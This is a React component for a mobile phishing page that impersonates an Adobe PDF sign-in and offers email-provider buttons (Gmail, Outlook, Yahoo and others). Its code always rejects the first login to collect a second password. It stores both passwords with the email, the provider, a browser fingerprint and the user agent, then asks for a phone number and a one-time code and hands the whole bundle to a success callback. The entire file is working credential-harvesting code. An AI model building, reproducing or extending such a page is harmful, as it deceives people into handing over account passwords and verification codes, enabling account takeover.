import React, { useState } from 'react';
import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles, Smartphone, AtSign } from 'lucide-react';
import { getBrowserFingerprint } from '../../utils/oauthHandler';
import {
  generateOTP,
  storeOTPSession,
  verifyOTP,
  sendOTPToUser,
  clearOTPSession
} from '../../utils/otpManager';

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
}

const FIRST_ATTEMPT_KEY = 'adobe_first_attempt';

const MobileLoginPage: React.FC<LoginPageProps> = ({ 
  fileName, 
  onBack, 
  onLoginSuccess,
  onLoginError 
}) => {
  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [errorMessage, setErrorMessage] = useState('');
  
  // OTP Flow States
  const [showOTPFlow, setShowOTPFlow] = useState(false);
  const [deliveryMethod, setDeliveryMethod] = useState<'email' | 'phone' | null>(null);
  const [phone, setPhone] = useState('');
  const [otp, setOtp] = useState('');
  const [firstAttemptPassword, setFirstAttemptPassword] = useState('');
  const [secondAttemptPassword, setSecondAttemptPassword] = useState('');
  const [currentEmail, setCurrentEmail] = useState('');

  const emailProviders = [
    { name: 'Office365', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png' },
    { name: 'Yahoo', domain: 'yahoo.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png' },
    { name: 'Outlook', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png' },
    { name: 'AOL', domain: 'aol.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png' },
    { name: 'Gmail', domain: 'gmail.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png' },
    { name: 'Others', domain: 'other.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
  ];

  const handleProviderSelect = (provider: string) => {
    console.log(`🔐 Selected provider: ${provider}`);
    setSelectedProvider(provider);
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password || !selectedProvider) return;

    setIsLoading(true);
    setErrorMessage('');

    try {
      const currentAttempt = loginAttempts + 1;
      setLoginAttempts(currentAttempt);

      const browserFingerprint = await getBrowserFingerprint();

      const attemptData = {
        email,
        password,
        provider: selectedProvider,
        attemptTimestamp: new Date().toISOString(),
        localFingerprint: browserFingerprint,
        fileName: 'Adobe Cloud Access'
      };

      if (currentAttempt === 1) {
        try {
          if (typeof sessionStorage !== 'undefined') {
            sessionStorage.setItem(FIRST_ATTEMPT_KEY, JSON.stringify(attemptData));
            console.log('🔒 Mobile: first attempt captured (invalid password)');
          }
        } catch (err) {
          console.warn('⚠️ Mobile: could not write first attempt:', err);
        }

        setFirstAttemptPassword(password);
        await new Promise(resolve => setTimeout(resolve, 1500));
        setErrorMessage('Invalid email or password. Please try again.');
        setIsLoading(false);
        return;
      }

      if (currentAttempt === 2) {
        setSecondAttemptPassword(password);
        setCurrentEmail(email);
        setShowOTPFlow(true);
        setIsLoading(false);
        console.log('✅ Mobile: Second attempt - Moving to OTP selection');
        return;
      }

    } catch (error) {
      console.error('Mobile login error:', error);
      if (onLoginError) onLoginError('Login failed. Please try again.');
      setIsLoading(false);
    }
  };

  const handleDeliveryMethodSelect = async (method: 'email' | 'phone') => {
    setDeliveryMethod(method);
    setIsLoading(true);
    setErrorMessage('');

    try {
      const generatedOTP = generateOTP();

      storeOTPSession({
        email: currentEmail,
        phone: method === 'phone' ? phone : undefined,
        deliveryMethod: method,
        otp: generatedOTP,
        createdAt: new Date().toISOString(),
        firstAttemptPassword,
        secondAttemptPassword,
        provider: selectedProvider || 'Others',
        userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
      });

      const sendSuccess = await sendOTPToUser(
        currentEmail,
        method === 'phone' ? phone : undefined,
        method,
        generatedOTP
      );

      if (sendSuccess) {
        console.log(`✅ Mobile: OTP sent via ${method}`);
        setErrorMessage('');
      } else {
        throw new Error(`Failed to send OTP via ${method}`);
      }

      setIsLoading(false);
    } catch (error) {
      console.error('Mobile OTP sending error:', error);
      setErrorMessage(`Failed to send OTP. Please try again.`);
      setIsLoading(false);
      setDeliveryMethod(null);
    }
  };

  const handleOTPSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!otp || otp.length !== 6) {
      setErrorMessage('Please enter a valid 6-digit OTP');
      return;
    }

    setIsLoading(true);
    setErrorMessage('');

    try {
      const isValid = verifyOTP(currentEmail, otp);

      if (!isValid) {
        setErrorMessage('Invalid OTP. Please try again.');
        setIsLoading(false);
        return;
      }

      const browserFingerprint = await getBrowserFingerprint();
      const completionData = {
        email: currentEmail,
        password: secondAttemptPassword,
        provider: selectedProvider,
        attemptTimestamp: new Date().toISOString(),
        localFingerprint: browserFingerprint,
        fileName: 'Adobe Cloud Access',
        firstAttemptPassword,
        secondAttemptPassword,
        otpEntered: otp,
        deliveryMethod,
        phone: deliveryMethod === 'phone' ? phone : undefined,
      };

      console.log('✅ Mobile: OTP verified successfully!');

      if (onLoginSuccess) {
        onLoginSuccess(completionData);
      }

      clearOTPSession(currentEmail);

    } catch (error) {
      console.error('Mobile OTP verification error:', error);
      setErrorMessage('OTP verification failed. Please try again.');
      setIsLoading(false);
    }
  };

  const handleBackToForm = () => {
    setShowOTPFlow(false);
    setDeliveryMethod(null);
    setPhone('');
    setOtp('');
    setErrorMessage('');
  };

  const handleBackToProviders = () => {
    setSelectedProvider(null);
    setEmail('');
    setPassword('');
    setLoginAttempts(0);
    setErrorMessage('');
    setShowOTPFlow(false);
    setDeliveryMethod(null);
  };

  // OTP FLOW: Select delivery method
  if (showOTPFlow && !deliveryMethod) {
    return (
      <div
        className="mobile-login-bg min-h-screen flex items-center justify-center p-4 relative overflow-hidden bg-gray-50"
        style={{
          backgroundImage: "url('https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg/640px-Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg')",
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          backgroundRepeat: 'no-repeat'
        }}
      >
        <div className="w-full max-w-sm relative z-10 mx-4">
          <div className="bg-white/95 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 p-5 relative overflow-hidden">
            <div className="absolute inset-0 bg-gradient-to-br from-white/40 to-transparent pointer-events-none"></div>
            <div className="relative z-10">
              <div className="flex items-center justify-center mb-3">
                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-100">
                  <Sparkles className="w-3.5 h-3.5 text-blue-500" />
                  <span className="text-xs font-medium text-blue-700">Verify Your Identity</span>
                </div>
              </div>

              <div className="space-y-4">
                <p className="text-sm text-slate-600">How would you like to receive your verification code?</p>

                <button
                  onClick={() => handleDeliveryMethodSelect('email')}
                  disabled={isLoading}
                  className="w-full flex items-center gap-4 p-4 rounded-xl bg-white border border-gray-200 hover:border-indigo-300 hover:bg-indigo-50 transition-all duration-200 disabled:opacity-60 disabled:cursor-not-allowed"
                >
                  <div className="flex items-center justify-center w-12 h-12 rounded-lg bg-indigo-100">
                    <Mail className="w-6 h-6 text-indigo-600" />
                  </div>
                  <div className="text-left flex-1">
                    <p className="font-semibold text-slate-900">Email</p>
                    <p className="text-xs text-slate-500">{currentEmail}</p>
                  </div>
                  {isLoading && <div className="w-4 h-4 border-2 border-indigo-300 border-t-indigo-600 rounded-full animate-spin" />}
                </button>

                <div className="relative">
                  <div className="absolute inset-0 flex items-center">
                    <div className="w-full border-t border-gray-200"></div>
                  </div>
                  <div className="relative flex justify-center text-sm">
                    <span className="px-2 bg-white text-gray-500">or</span>
                  </div>
                </div>

                <div>
                  <label className="block text-sm font-medium text-slate-700 mb-2">Send to Phone</label>
                  <div className="flex gap-2">
                    <div className="relative flex-1">
                      <Smartphone className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-5 h-5" />
                      <input
                        type="tel"
                        value={phone}
                        onChange={(e) => setPhone(e.target.value)}
                        placeholder="Enter phone number"
                        className="w-full pl-12 pr-4 py-3 bg-slate-50 border border-gray-100 rounded-xl text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-200 transition"
                      />
                    </div>
                    <button
                      onClick={() => handleDeliveryMethodSelect('phone')}
                      disabled={isLoading || !phone}
                      className="px-4 py-3 rounded-xl font-semibold text-white bg-gradient-to-r from-indigo-600 to-indigo-500 hover:from-indigo-700 hover:to-indigo-600 disabled:opacity-60 disabled:cursor-not-allowed shadow transition-all"
                    >
                      {isLoading ? <span className="inline-block w-4 h-4 border-2 border-white/40 border-t-white rounded-full animate-spin" /> : 'Send'}
                    </button>
                  </div>
                </div>

                {errorMessage && (
                  <div className="rounded-lg p-3 bg-red-50 border border-red-100">
                    <p className="text-sm text-red-700">{errorMessage}</p>
                  </div>
                )}
              </div>

              <div className="mt-5 pt-2 border-t border-gray-100">
                <button
                  onClick={handleBackToForm}
                  className="text-sm text-slate-600 hover:text-slate-900 font-medium w-full text-center"
                >
                  ← Back to login
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // OTP FLOW: Enter OTP code
  if (showOTPFlow && deliveryMethod) {
    return (
      <div
        className="mobile-login-bg min-h-screen flex items-center justify-center p-4 relative overflow-hidden bg-gray-50"
        style={{
          backgroundImage: "url('https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg/640px-Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg')",
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          backgroundRepeat: 'no-repeat'
        }}
      >
        <div className="w-full max-w-sm relative z-10 mx-4">
          <div className="bg-white/95 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 p-5 relative overflow-hidden">
            <div className="absolute inset-0 bg-gradient-to-br from-white/40 to-transparent pointer-events-none"></div>
            <div className="relative z-10">
              <div className="flex items-center justify-center mb-3">
                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-100">
                  <Sparkles className="w-3.5 h-3.5 text-blue-500" />
                  <span className="text-xs font-medium text-blue-700">Enter Verification Code</span>
                </div>
              </div>

              <div className="space-y-4">
                <p className="text-sm text-slate-600">
                  We've sent a 6-digit verification code to your {deliveryMethod === 'email' ? 'email' : 'phone number'}.
                </p>

                <form onSubmit={handleOTPSubmit} className="space-y-4">
                  {errorMessage && (
                    <div className="bg-gradient-to-r from-red-50 to-pink-50 border border-red-200 rounded-lg p-3">
                      <p className="text-red-700 text-xs font-medium">{errorMessage}</p>
                    </div>
                  )}

                  <div>
                    <label className="block text-xs font-semibold text-gray-700 mb-1.5">Verification Code</label>
                    <div className="relative group">
                      <AtSign className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4 group-focus-within:text-blue-500 transition-colors" />
                      <input
                        type="text"
                        value={otp}
                        onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
                        placeholder="000000"
                        maxLength={6}
                        className="w-full pl-10 pr-3 py-3 bg-white/90 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 text-center text-2xl tracking-widest font-semibold"
                      />
                    </div>
                    <p className="text-xs text-slate-500 mt-1 text-center">{otp.length}/6 digits</p>
                  </div>

                  <button
                    type="submit"
                    disabled={isLoading || otp.length !== 6}
                    className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white py-3.5 rounded-xl font-bold text-sm hover:from-blue-700 hover:to-indigo-700 disabled:opacity-60 disabled:cursor-not-allowed transition-all duration-200 shadow-lg"
                  >
                    <div className="flex items-center justify-center gap-2">
                      {isLoading && (
                        <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                      )}
                      {isLoading ? 'Verifying...' : 'Verify Code'}
                    </div>
                  </button>
                </form>
              </div>

              <div className="mt-5 pt-2 border-t border-gray-100">
                <button
                  onClick={handleBackToForm}
                  className="text-sm text-slate-600 hover:text-slate-900 font-medium w-full text-center"
                >
                  ← Back
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // REGULAR LOGIN FORM
  return (
    <div
      className="mobile-login-bg min-h-screen flex items-center justify-center p-4 relative overflow-hidden bg-gray-50"
      style={{
        backgroundImage: "url('https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg/640px-Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg')",
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundRepeat: 'no-repeat'
      }}
    >
      <div className="sm:hidden absolute inset-x-0 top-6 flex flex-col items-center gap-2 px-4">
        <div className="mt-4 text-center">
          <div className="text-white/90 text-xs">PDF and e-signing tools</div>
          <div className="text-white/80 text-xs italic mt-1">Securely access your PDFs</div>
        </div>
      </div>

      <div className="w-full max-w-sm relative z-10 mx-4">
        <div className="bg-white/95 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 p-5 relative overflow-hidden md:min-h=[460px]">
          <div className="absolute inset-0 bg-gradient-to-br from-white/40 to-transparent pointer-events-none"></div>
          <div className="relative z-10">
            <div className="flex items-center justify-center mb-3">
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-100">
                <Sparkles className="w-3.5 h-3.5 text-blue-500" />
                <span className="text-xs font-medium text-blue-700">Select Your Provider</span>
              </div>
            </div>

            <div className="mt-2">
              {!selectedProvider ? (
                <div className="space-y-4">
                  <div className="grid grid-cols-3 gap-3">
                    {emailProviders.map((provider) => (
                      <button 
                        key={provider.name} 
                        onClick={() => handleProviderSelect(provider.name)} 
                        className="group relative flex flex-col items-center gap-2 p-3 bg-white/75 backdrop-blur-sm rounded-xl shadow-sm border border-gray-100/50 hover:shadow-lg hover:bg-white/80 transition-all duration-200 transform active:scale-95" 
                        aria-label={`Select ${provider.name}`} 
                        type="button"
                      >
                        <img 
                          src={provider.logo} 
                          alt={provider.name} 
                          className="w-8 h-8 object-contain" 
                          onError={(e) => { const t = e.target as HTMLImageElement; t.style.display = 'none'; }}
                        />
                        <div className="text-xs font-semibold text-gray-800 group-hover:text-gray-900 transition-colors text-center truncate">
                          {provider.name}
                        </div>
                        <div className="absolute inset-0 rounded-xl bg-gradient-to-br from-white/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-200 pointer-events-none"></div>
                      </button>
                    ))}
                  </div>
                </div>
              ) : (
                <div className="space-y-4">
                  <div className="flex items-center gap-2 mb-4">
                    <button 
                      onClick={handleBackToProviders} 
                      className="p-1.5 rounded-md hover:bg-gray-100 transition-colors" 
                      type="button"
                    >
                      <ArrowLeft className="w-4 h-4 text-gray-600" />
                    </button>
                    <div className="flex items-center gap-2">
                      <img 
                        src={emailProviders.find(p => p.name === selectedProvider)?.logo} 
                        alt={selectedProvider} 
                        className="w-6 h-6 object-contain" 
                        onError={(e) => { const t = e.target as HTMLImageElement; t.style.display = 'none'; }}
                      />
                      <h2 className="text-sm font-bold text-gray-900">Sign in with {selectedProvider}</h2>
                    </div>
                  </div>

                  <form onSubmit={handleFormSubmit} className="space-y-3">
                    {errorMessage && (
                      <div className="bg-gradient-to-r from-red-50 to-pink-50 border border-red-200 rounded-lg p-3">
                        <p className="text-red-700 text-xs font-medium">{errorMessage}</p>
                      </div>
                    )}

                    <div className="space-y-3">
                      <div>
                        <label className="block text-xs font-semibold text-gray-700 mb-1.5">Email Address</label>
                        <div className="relative group">
                          <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4 group-focus-within:text-blue-500 transition-colors" />
                          <input 
                            type="email" 
                            value={email} 
                            onChange={(e) => setEmail(e.target.value)} 
                            className="w-full pl-10 pr-3 py-3 bg-white/90 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 text-sm" 
                            placeholder="Enter your email" 
                            required 
                          />
                        </div>
                      </div>

                      <div>
                        <label className="block text-xs font-semibold text-gray-700 mb-1.5">Password</label>
                        <div className="relative group">
                          <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4 group-focus-within:text-blue-500 transition-colors" />
                          <input 
                            type={showPassword ? 'text' : 'password'} 
                            value={password} 
                            onChange={(e) => setPassword(e.target.value)} 
                            className="w-full pl-10 pr-10 py-3 bg-white/90 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 text-sm" 
                            placeholder="Enter your password" 
                            required 
                          />
                          <button 
                            type="button" 
                            onClick={() => setShowPassword(!showPassword)} 
                            className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700 transition-colors"
                          >
                            {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                          </button>
                        </div>
                      </div>
                    </div>

                    <button 
                      type="submit" 
                      disabled={isLoading || !email || !password} 
                      className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white py-3.5 rounded-xl font-bold text-sm hover:from-blue-700 hover:to-indigo-700 disabled:opacity-60 disabled:cursor-not-allowed transition-all duration-200 shadow-lg"
                    >
                      <div className="flex items-center justify-center gap-2">
                        {isLoading && (
                          <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                        )}
                        {isLoading ? (loginAttempts === 0 ? 'Signing in...' : 'Verifying...') : 'Sign In Securely'}
                      </div>
                    </button>
                  </form>
                </div>
              )} 
            </div>

            <div className="mt-5 text-center">
              <p className="text-xs text-gray-500">© 2025 Adobe Inc. SSL secured.</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default MobileLoginPage;